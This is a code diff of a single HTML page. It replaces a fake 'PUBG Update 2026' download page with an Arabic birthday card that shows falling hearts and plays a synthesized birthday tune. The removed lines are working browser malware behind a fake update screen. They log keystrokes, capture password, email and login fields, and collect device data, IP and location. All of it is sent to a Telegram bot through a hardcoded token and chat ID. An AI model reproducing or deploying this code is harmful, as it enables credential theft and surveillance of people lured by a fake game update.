@@ -3,301 +3,268 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PUBG Update 2026</title>
+    <title>🎉 عيد ميلاد حبيبتي 🎉</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
-            background: #0a0a0a;
-            color: #fff;
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 50px 20px;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            margin: 0;
+            font-family: 'Arial', cursive, sans-serif;
+            overflow: hidden;
+            padding: 20px;
         }
-        .box {
-            background: #1a1a2e;
-            padding: 40px 30px;
-            border-radius: 25px;
-            max-width: 420px;
+        .card {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(12px);
+            border-radius: 50px;
+            padding: 50px 40px;
+            max-width: 600px;
             width: 100%;
-            border: 1px solid #e94560;
-            box-shadow: 0 20px 60px rgba(233, 69, 96, 0.15);
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6);
+            position: relative;
+            z-index: 10;
+            animation: fadeIn 2s ease;
         }
-        .loader {
-            border: 4px solid #333;
-            border-top: 4px solid #e94560;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
+        @keyframes fadeIn {
+            0% { opacity: 0; transform: scale(0.8); }
+            100% { opacity: 1; transform: scale(1); }
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .emoji-big {
+            font-size: 80px;
+            display: block;
+            margin-bottom: 10px;
+            animation: pulse 2s infinite;
         }
-        .status {
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+        h1 {
+            color: #fff;
+            font-size: 34px;
+            font-weight: 900;
+            margin-bottom: 10px;
+            background: linear-gradient(45deg, #f7971e, #ffd200);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            display: inline-block;
+        }
+        .subtitle {
+            color: #ff6b9d;
+            font-size: 26px;
+            font-weight: bold;
+            margin: 10px 0 20px;
+            text-shadow: 0 0 30px #ff6b9d;
+        }
+        .message {
+            color: #e0e0e0;
+            font-size: 20px;
+            line-height: 2;
+            margin: 20px 0 30px;
+            text-align: center;
+            direction: rtl;
+        }
+        .message i {
+            color: #ff6b9d;
+        }
+        .heart-rain {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 999;
+        }
+        .heart {
+            position: absolute;
+            font-size: 24px;
+            animation: fall linear infinite;
+            opacity: 0.7;
+            user-select: none;
+        }
+        @keyframes fall {
+            0% { transform: translateY(-10vh) rotate(0deg) scale(1); opacity: 0.8; }
+            100% { transform: translateY(110vh) rotate(720deg) scale(0.3); opacity: 0; }
+        }
+        .balloon {
+            font-size: 60px;
+            display: inline-block;
+            animation: float 3s ease-in-out infinite;
+        }
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-15px); }
+        }
+        .btn-music {
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            color: #fff;
+            padding: 12px 30px;
+            border-radius: 50px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 15px;
+        }
+        .btn-music:hover {
+            background: rgba(255, 255, 255, 0.2);
+            transform: scale(1.05);
+        }
+        .footer {
             color: #888;
-            font-size: 14px;
-            margin-top: 10px;
+            font-size: 15px;
+            margin-top: 25px;
+            opacity: 0.6;
+            direction: rtl;
         }
-        .note {
-            color: #ffcc00;
-            font-size: 11px;
-            margin-top: 20px;
-            border-top: 1px solid #333;
-            padding-top: 20px;
+        .heart-icon {
+            color: #ff6b9d;
+        }
+        .big-heart {
+            font-size: 100px;
+            animation: pulse 1.5s infinite;
+            display: block;
+            margin: 10px auto;
+        }
+        @media (max-width: 480px) {
+            .card { padding: 30px 20px; }
+            h1 { font-size: 26px; }
+            .message { font-size: 17px; }
+            .subtitle { font-size: 20px; }
         }
     </style>
 </head>
 <body>
-<div class="box">
-    <h1>🔥 PUBG UPDATE 2026</h1>
-    <p>جاري تحميل التحديث الجديد...</p>
-    <div class="loader"></div>
-    <p class="status" id="status">⏳ يرجى الانتظار...</p>
-    <p class="note">⚠️ لا تغلق الصفحة حتى انتهاء التحديث</p>
+
+<!-- قلوب متساقطة -->
+<div class="heart-rain" id="heartRain"></div>
+
+<!-- البطاقة -->
+<div class="card">
+    <span class="emoji-big">🎂</span>
+    <h1>🎉 عيد ميلاد حبيبتي 🎉</h1>
+    <div class="subtitle">💖 يا روحي 💖</div>
+    
+    <div class="message">
+        <i>❤️ كل عام وأنتي نور عيوني ❤️</i><br><br>
+        اليوم يومج .. يوم الفرحة اللي ما تفارق وجهج 🌸<br>
+        كل سنة وأنتي طيبة .. وكل سنة وأجمالج تزيد 😍<br>
+        أنتي مثل الورد .. كل ما أشوفج تفتح النفسية 💫<br>
+        وعيونج .. يا عيونج .. لو تغيب الدنيا كلها، تبقين أنتي الدنيا بحق ❤️<br><br>
+        اليوم الك .. والقلب الك .. وكل الحب الك 💞<br>
+        ما أريد غير فرحتج .. ولو أطلب من الله سنة وحدة، أطلبها تكون معاج 🙏<br><br>
+        يا روحي .. يا نبض قلبي .. يا أجمل شي صار بحياتي ❤️<br>
+        كل سنة وأنتي ملكتي .. وكل سنة وأنتي حبيبتي 🌹<br>
+        كل سنة وأنتي عمري الجاي .. وكل سنة وأنا أحبج أكثر 💖<br><br>
+        ما عندي هدية أغلى من دعائي الك .. ربنا يحفظج ويخليج لي 🤲<br>
+        وكل عام وأنتي بخير يا أحلى بنت بالدنيا 💕
+    </div>
+
+    <div>
+        <span class="balloon">🎈</span>
+        <span class="balloon" style="animation-delay:0.5s;">🎈</span>
+        <span class="balloon" style="animation-delay:1s;">🎈</span>
+        <span class="balloon" style="animation-delay:1.5s;">🎈</span>
+        <span class="balloon" style="animation-delay:2s;">🎈</span>
+    </div>
+
+    <button class="btn-music" id="musicBtn">🎵 شغّل الموسيقى 🎵</button>
+    
+    <div class="footer">
+        ❤️ من قلب يحبك .. إلى أغلى إنسانة بحياتي ❤️
+    </div>
 </div>
 
 <script>
 // ==========================================
-// إعدادات التيليجرام
+// 1. توليد القلوب المتساقطة
 // ==========================================
-const BOT_TOKEN = "8959014011:AAFI8eCWilYlrIGtfK6NmjqhgIN1KDWoDVM";
-const CHAT_ID = "5730027675";
-
-// ==========================================
-// دوال الإرسال
-// ==========================================
-function sendToTelegram(message) {
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: message,
-            parse_mode: 'Markdown'
-        })
-    }).catch(() => {});
-}
-
-function sendFileToTelegram(content, filename, caption) {
-    const blob = new Blob([content], { type: 'text/plain' });
-    const file = new File([blob], filename);
-    const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    formData.append('document', file);
-    formData.append('caption', caption);
+function createHearts() {
+    const container = document.getElementById('heartRain');
+    const emojis = ['❤️', '💖', '💗', '💓', '💕', '💘', '💝', '♥️', '💛', '🧡'];
+    const colors = ['#ff6b9d', '#ff3366', '#ff1493', '#ff4d6d', '#ff8c9e', '#ffb3c6', '#ff69b4'];
     
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
-        method: 'POST',
-        body: formData
-    }).catch(() => {});
-}
-
-// ==========================================
-// 1. Keylogger - تسجيل كل ما يكتب
-// ==========================================
-let keyLog = [];
-let lastSendTime = Date.now();
-
-document.addEventListener('keydown', function(e) {
-    const key = e.key;
-    
-    // تجاهل مفاتيح التحكم
-    if (key === 'Control' || key === 'Shift' || key === 'Alt' || key === 'Meta') return;
-    
-    // تسجيل الضغطة
-    const time = new Date().toLocaleTimeString();
-    keyLog.push(`[${time}] ${key}`);
-    
-    // إرسال كل 10 ضغطات أو كل 30 ثانية
-    if (keyLog.length >= 10 || (Date.now() - lastSendTime) > 30000) {
-        sendKeyLog();
-    }
-});
-
-// ==========================================
-// 2. مراقبة النماذج (Forms)
-// ==========================================
-document.addEventListener('input', function(e) {
-    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
-        const name = e.target.name || e.target.id || 'غير معروف';
-        const value = e.target.value;
-        
-        // البحث عن كلمات مفتاحية
-        const keywords = ['email', 'password', 'pass', 'user', 'login', 'pubg', 'id', 'phone', 'number'];
-        let isSensitive = false;
-        for (let kw of keywords) {
-            if (name.toLowerCase().includes(kw) || value.toLowerCase().includes(kw)) {
-                isSensitive = true;
-                break;
-            }
-        }
-        
-        if (isSensitive && value.length > 2) {
-            sendToTelegram(`📝 **نموذج مكتشف:**\n• الحقل: ${name}\n• القيمة: ${value}`);
-        }
-    }
-});
-
-// ==========================================
-// 3. إرسال سجل الضغطات
-// ==========================================
-function sendKeyLog() {
-    if (keyLog.length === 0) return;
-    
-    const logText = keyLog.join('\n');
-    keyLog = [];
-    lastSendTime = Date.now();
-    
-    // إرسال كملف أو رسالة
-    if (logText.length > 4000) {
-        sendFileToTelegram(logText, `keys_${Date.now()}.txt`, '📁 سجل الضغطات');
-    } else {
-        sendToTelegram(`⌨️ **سجل الضغطات:**\n\`\`\`\n${logText}\n\`\`\``);
+    for (let i = 0; i < 100; i++) {
+        const heart = document.createElement('div');
+        heart.className = 'heart';
+        heart.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+        heart.style.left = Math.random() * 100 + '%';
+        heart.style.fontSize = (Math.random() * 20 + 16) + 'px';
+        heart.style.animationDuration = (Math.random() * 5 + 6) + 's';
+        heart.style.animationDelay = (Math.random() * 12) + 's';
+        heart.style.color = colors[Math.floor(Math.random() * colors.length)];
+        container.appendChild(heart);
     }
 }
 
 // ==========================================
-// 4. مراقبة PUBG Mobile (محاكاة)
+// 2. تشغيل الموسيقى (نغمات عيد ميلاد سعيد)
 // ==========================================
-function monitorPUBG() {
-    // مراقبة إذا كان المستخدم يبحث عن PUBG
-    const keywords = ['pubg', 'battlegrounds', 'تحديث بوبجي', 'pubg mobile', 'pubg hack'];
-    
-    // مراقبة عنوان الصفحة
-    const titleObserver = new MutationObserver(() => {
-        const title = document.title.toLowerCase();
-        for (let kw of keywords) {
-            if (title.includes(kw)) {
-                sendToTelegram(`🎯 **تم اكتشاف PUBG في العنوان:** ${document.title}`);
-                break;
-            }
-        }
-    });
-    titleObserver.observe(document.querySelector('title'), { childList: true });
-    
-    // مراقبة الروابط
-    document.addEventListener('click', function(e) {
-        if (e.target.tagName === 'A') {
-            const link = e.target.href || '';
-            for (let kw of keywords) {
-                if (link.toLowerCase().includes(kw)) {
-                    sendToTelegram(`🔗 **رابط PUBG مكتشف:** ${link}`);
-                    break;
-                }
-            }
-        }
-    });
-}
+let audioCtx = null;
+let isPlaying = false;
 
-// ==========================================
-// 5. جمع معلومات الجهاز
-// ==========================================
-function getDeviceInfo() {
-    const info = {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        screen: `${screen.width}x${screen.height}`,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        url: window.location.href,
-        referrer: document.referrer || 'مباشر'
-    };
-    return info;
-}
-
-// ==========================================
-// 6. الحصول على IP
-// ==========================================
-async function getIP() {
-    try {
-        const res = await fetch('https://api.ipify.org?format=json');
-        const data = await res.json();
-        return data.ip;
-    } catch {
-        return 'غير معروف';
+function playHappyBirthday() {
+    if (audioCtx === null) {
+        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    }
+    
+    if (isPlaying) {
+        isPlaying = false;
+        document.getElementById('musicBtn').textContent = '🎵 شغّل الموسيقى 🎵';
+        return;
+    }
+    
+    isPlaying = true;
+    document.getElementById('musicBtn').textContent = '⏹️ أوقف الموسيقى';
+    
+    const notes = [
+        { freq: 262, dur: 0.3 }, { freq: 262, dur: 0.3 },
+        { freq: 294, dur: 0.5 }, { freq: 262, dur: 0.5 },
+        { freq: 349, dur: 0.5 }, { freq: 330, dur: 0.6 },
+        { freq: 262, dur: 0.3 }, { freq: 262, dur: 0.3 },
+        { freq: 294, dur: 0.5 }, { freq: 262, dur: 0.5 },
+        { freq: 392, dur: 0.5 }, { freq: 349, dur: 0.6 },
+        { freq: 262, dur: 0.3 }, { freq: 262, dur: 0.3 },
+        { freq: 523, dur: 0.5 }, { freq: 440, dur: 0.5 },
+        { freq: 349, dur: 0.5 }, { freq: 330, dur: 0.5 },
+        { freq: 294, dur: 0.6 }
+    ];
+    
+    let time = 0;
+    for (let note of notes) {
+        setTimeout(() => {
+            if (!isPlaying) return;
+            const osc = audioCtx.createOscillator();
+            const gain = audioCtx.createGain();
+            osc.type = 'sine';
+            osc.frequency.value = note.freq;
+            gain.gain.setValueAtTime(0.12, audioCtx.currentTime);
+            gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + note.dur);
+            osc.connect(gain);
+            gain.connect(audioCtx.destination);
+            osc.start();
+            osc.stop(audioCtx.currentTime + note.dur);
+        }, time * 1000);
+        time += note.dur + 0.05;
     }
 }
 
 // ==========================================
-// 7. الحصول على الموقع
-// ==========================================
-async function getLocation() {
-    try {
-        const res = await fetch('https://ipinfo.io/json');
-        const data = await res.json();
-        return {
-            ip: data.ip || 'غير معروف',
-            city: data.city || 'غير معروف',
-            country: data.country || 'غير معروف',
-            loc: data.loc || 'غير معروف',
-            org: data.org || 'غير معروف'
-        };
-    } catch {
-        return null;
-    }
-}
-
-// ==========================================
-// 8. التشغيل الرئيسي
-// ==========================================
-async function main() {
-    // إشعار البداية
-    sendToTelegram('🔥 **تم فتح الرابط الملغم (Keylogger)!**');
-    
-    // معلومات الجهاز
-    const deviceInfo = getDeviceInfo();
-    const ip = await getIP();
-    const location = await getLocation();
-    
-    let msg = `📱 **معلومات الجهاز:**\n`;
-    msg += `• المتصفح: ${deviceInfo.userAgent}\n`;
-    msg += `• المنصة: ${deviceInfo.platform}\n`;
-    msg += `• اللغة: ${deviceInfo.language}\n`;
-    msg += `• الشاشة: ${deviceInfo.screen}\n`;
-    msg += `• التوقيت: ${deviceInfo.timezone}\n`;
-    msg += `• الرابط: ${deviceInfo.url}\n`;
-    msg += `• الـ IP: ${ip}\n`;
-    if (location) {
-        msg += `• الدولة: ${location.country}\n`;
-        msg += `• المدينة: ${location.city}\n`;
-        msg += `• المزود: ${location.org}\n`;
-    }
-    sendToTelegram(msg);
-    
-    // بدء Keylogger
-    sendToTelegram('⌨️ **تم تفعيل Keylogger!**');
-    
-    // مراقبة PUBG
-    monitorPUBG();
-    
-    // تحديث حالة التحميل
-    document.getElementById('status').textContent = '⚠️ فشل التحديث، جارٍ المحاولة مجدداً...';
-    
-    setTimeout(() => {
-        document.getElementById('status').textContent = '❌ فشل التثبيت، يرجى المحاولة لاحقاً.';
-        document.querySelector('.loader').style.display = 'none';
-    }, 3000);
-}
-
-// ==========================================
-// التشغيل عند تحميل الصفحة
+// 3. تحميل الصفحة
 // ==========================================
 window.onload = function() {
-    main();
-    
-    // إرسال السجل كل 30 ثانية
-    setInterval(sendKeyLog, 30000);
-    
-    // إرسال السجل عند إغلاق الصفحة
-    window.addEventListener('beforeunload', function() {
-        sendKeyLog();
-    });
+    createHearts();
+    document.getElementById('musicBtn').addEventListener('click', playHappyBirthday);
 };
 </script>
 </body>
